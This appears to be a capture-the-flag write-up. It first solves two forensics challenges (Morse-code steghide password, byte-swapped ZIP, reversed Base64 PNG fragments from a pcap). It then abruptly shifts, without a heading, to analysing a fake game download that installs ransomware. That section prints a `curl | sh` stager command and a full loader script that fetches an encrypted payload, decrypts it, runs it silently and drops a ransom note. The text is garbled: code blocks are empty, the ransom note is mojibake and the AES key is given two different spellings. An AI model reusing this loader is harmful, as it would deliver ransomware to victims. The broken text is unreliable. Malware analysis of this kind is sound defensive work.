## What is it
- **Author**: KetSoSad

> I have a .wav file but I don't know what this sound means. Can you help me?

We are presented with a `.wav` file. As a creature of habit, I open the `.wav` in my beloved Sonic Visualizer and Add Spectrogram.

![.](/images/posts/0039.png)

> By the way, you can listen to the dots and dashes yourself, so the sound visualizer is kinda extra in this context.

We see dots and dashes, which is Morse Code. Upon translating it, we get "passwordisgoodluck".

The phrase sounds like a `steghide` password. Indeed, 

`steghide extract -sf chall.wav -p passwordisgoodluck` 

inflates `hidden.zip`. 

Extracting it, we get the `part1.txt`, which contains the first part of the flag `W1{s0m3_7h1ng5_1n` and `next2.zip`. However, that ZIP is corrupted, and we can not extract it further. Let's inspect the file:

![.](/images/posts/0040.png)

Taking a closer look at the magic bytes, we have `4b 50 04 03`. However, that of a standard ZIP file are `50 4b 03 04`

Moreover, looking down below for a little bit, we can see the string "aptr.2npg". If you flip every two letters, you will get "part2.png". This indicates two things:
- First, every two bytes are flipped in this corrupted ZIP.
- Second, there is a `part2.png` in the ZIP if we recover it.

We can conveniently repair this file with

`dd if=next2.zip of=recovered.zip conv=swab`

This command copies the contents from `next2.zip` to `recovered.zip` while swapping every pair of bytes. Inside the recovered zip, we get the second part of our flag.

![.](/images/posts/0041.png)

## Free flag on Network
- **Author**: KetSoSad

> Reverse free flag! Reverse free flag! Reverse free flag!

We are presented with `chall.pcapng`. At first glance, there are multiple POST requests (100, to be precise) with the name `flag*.txt`

![.](/images/posts/0043.png)

Export HTTP Objects and read the contents of the text, and we get a lot of Base64 encoding. Try to decode some of them using CyberChef:

`flag0.txt`

![.](/images/posts/0044.png)

`flag1.txt`

![.](/images/posts/0045.png)

`flag99.txt`

![.](/images/posts/0046.png)

We can see the `GNP` at the end of `flag0.txt` and `DNEI` at the start of `flag99.txt`. This indicates that, the `.png` is fragmented into 100 parts and its bytes are reversed, since the standard components of a PNG contains the chunk PNG and IEND at the start and the end. Therefore, we need to reverse and append them altogether for the flag, as the description has suggested.

**Solve script**

```
from pathlib import Path
import base64

chunks = []
for i in range(100):
    encoded = Path(f"flag{i}.txt").read_text().splitlines()[3]
    chunks.append(base64.b64decode(encoded)[::-1])

Path("recovered_flag.png").write_bytes(b"".join(chunks))
```

We get this image as our output:

![.](/images/posts/0047.png)

- `curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/download-minecrap.sh" | sh`

Create a request to the script stager, piped into sh to run.

- `download-minecrap.sh`
```

This displays friendly download text, fetches `downloader.sh` into `/tmp`, makes it executable, and creates a symlink at `~/minecrap`. The downloader is at `/tmp`, so it will be deleted upon shutdown. This helps the scammer to phish the victim into running the script while cover the trace.

- `downloader.sh`
```

It sets `AES_KEY` to `howsyourchancetobeabigshot`. This `AES_KEY` is going to be used again in the symmetric encryption phase.

It also downloads and runs `decrypter.sh` in the background. While the payload is already running, it prints fake status messages with timed pauses, and ends with `404 FILE NOT FOUND` and claims the program is unavailable, helping conceal what happened.

- `decrypter.sh`
```
#!/usr/bin/env sh

SEED="$(printf $AES_KEY | sha256sum)"
KEY="$(printf $SEED | cut -c 1-32)"
IV="$(printf $SEED | cut -c 33-64)"

SEED_R="$(printf "$USER-$(hostname)" | sha256sum)"
export KEY_R="$(printf $SEED_R | cut -c 1-32)"
export IV_R="$(printf $SEED_R | cut -c 33-64)"

curl -s "https://codeberg.org/evil-guy-on-the-internet/pages/raw/branch/main/file/ransom.sh" | xxd -r -p | openssl enc -d -aes-128-cbc -K "$KEY" -iv "$IV" | sh > /dev/null 2>&1

printf 'Đ’Đ°ÑˆĐ¸ Ñ„Đ°Đ¹Đ»Ñ‹ Đ·Đ°ÑˆĐ¸Ñ„Ñ€Đ¾Đ²Đ°Đ½Ñ‹, Đ´Đ»Ñ Ñ€Đ°ÑÑˆĐ¸Ñ„Ñ€Đ¾Đ²ĐºĐ¸ Đ¾Ñ‚Đ¿Ñ€Đ°Đ²ÑŒÑ‚Đµ $36000 Đ½Đ° 12345678910 TCB' > "ransom_note_$USER.txt"
```

This is the ransomware loader.

First, it takes an existing secret in `AES_KEY` (in the `downloader.sh`), hashes it with SHA-256 for the SEED, and splits the hexadecimal hash into two parts KEY and IV
- KEY: first 16 bytes for AES-128
- IV: last 16-byte initialization vector (CBC)

Moreover, it builds another value from the current username and hostname, exporting `KEY_R` and `IV_R`. The downloaded payload may use these to identify the victim or encrypt data uniquely per machine. This will make sense later.

Then, it silently downloads `ransom.sh` from Codeberg, treats it as hex-encoded data, converts it back to bytes, decrypts it using AES-128-CBC, and pipes the resulting plaintext directly into the shell for execution. 

> The encryption at play is AES, which is symmetric and easier to be reversed. In fact, a real ransomware would more likely to use asymmetric encryption, such as RSA.

Finally, silences all output/errors of the installment of the ransomware with `> /dev/null 2>&1` to conceal the malicious intent and then creates a ransom-note file named like `ransom_note_<username>.txt`.

We are provided with:

`AES_KEY = "nowsyourchancetobeabigshot"`
